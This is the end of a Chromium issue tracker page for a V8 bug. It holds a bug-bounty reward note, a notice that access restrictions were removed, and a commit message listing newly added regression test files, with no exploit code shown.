Congratulations 303f06e3! Thank you for your excellent efforts on this report. Had you gone an extra step and demonstrated a controlled write or RCE, this report would have been eligible for a much higher reward. It was of very high quality, however, so it was eligible for the highest reward amount based on the demonstrable information provided. Nice work!

### pe...@google.com (2024-12-26)

This bug has been closed for more than 14 weeks. Removing issue access restrictions.

### dx...@google.com (2026-05-29)

Project: v8/v8  

Branch:  main  

Author:  Michael Lippautz [mlippautz@chromium.org](mailto:mlippautz@chromium.org)  

Link:    <https://chromium-review.googlesource.com/7883043>

[test] Last batch of regression tests

---


Expand for full commit details
```
     
    TAG=AGY 
     
    Bug: 517688821 
     
    Bug: 40061466 
    Bug: 40066473 
    Bug: 342456991 
    Bug: 343507800 
    Bug: 366381662 
    Bug: 368311899 
    Bug: 372269618 
    Bug: 383647255 
    Bug: 392521083 
    Bug: 398999390 
    Bug: 40059920 
    Bug: 40060821 
    Bug: 40064370 
    Bug: 40065138 
    Bug: 40282100 
    Bug: 40892749 
    Bug: 41484971 
    Bug: 420636529 
    Bug: 42203224 
    Bug: 423459708 
    Bug: 450328966 
    Bug: 452296415 
    Bug: 469143679 
    Bug: 476233066 
    Bug: 478659010 
    Bug: 485267831 
    Bug: 508811477 
    Change-Id: I692cb14ebeac04eaa77c867e9377ebd19b4b909b 
    Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/7883043 
    Auto-Submit: Michael Lippautz <mlippautz@chromium.org> 
    Commit-Queue: Michael Lippautz <mlippautz@chromium.org> 
    Reviewed-by: Leszek Swirski <leszeks@chromium.org> 
    Commit-Queue: Leszek Swirski <leszeks@chromium.org> 
    Cr-Commit-Position: refs/heads/main@{#107659}

```

---

Files:

- A `test/mjsunit/compiler/regress-40061466.js`
- A `test/mjsunit/maglev/regress-40066473.js`
- A `test/mjsunit/regress/regress-342456991.js`
- A `test/mjsunit/regress/regress-343507800.js`
- A `test/mjsunit/regress/regress-366381662.js`
- A `test/mjsunit/regress/regress-368311899.js`
- A `test/mjsunit/regress/regress-372269618.js`
- A `test/mjsunit/regress/regress-383647255.js`
- A `test/mjsunit/regress/regress-392521083.js`
- A `test/mjsunit/regress/regress-398999390.js`
- A `test/mjsunit/regress/regress-40059920.js`
- A `test/mjsunit/regress/regress-40060821.js`
- A `test/mjsunit/regress/regress-40064370.js`
- A `test/mjsunit/regress/regress-40065138.js`
- A `test/mjsunit/regress/regress-40282100.js`
- A `test/mjsunit/regress/regress-40892749.js`
- A `test/mjsunit/regress/regress-41484971.js`
- A `test/mjsunit/regress/regress-420636529.js`
- A `test/mjsunit/regress/regress-42203224.js`
- A `test/mjsunit/regress/regress-423459708.js`
- A `test/mjsunit/regress/regress-450328966.js`
- A `test/mjsunit/regress/regress-452296415.js`
- A `test/mjsunit/regress/regress-469143679.js`
- A `test/mjsunit/regress/regress-476233066-1.js`
- A `test/mjsunit/regress/regress-476233066-2.js`
- A `test/mjsunit/regress/regress-478659010.js`
- A `test/mjsunit/regress/regress-485267831.js`
- A `test/mjsunit/regress/regress-508811477.js`

---

Hash: [a5d1a1cc6911f1d1c7f30da136c8f252b05a58dc](https://chromiumdash.appspot.com/commit/a5d1a1cc6911f1d1c7f30da136c8f252b05a58dc)  

Date: Fri May 29 12:59:59 2026


---

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/366381662)*
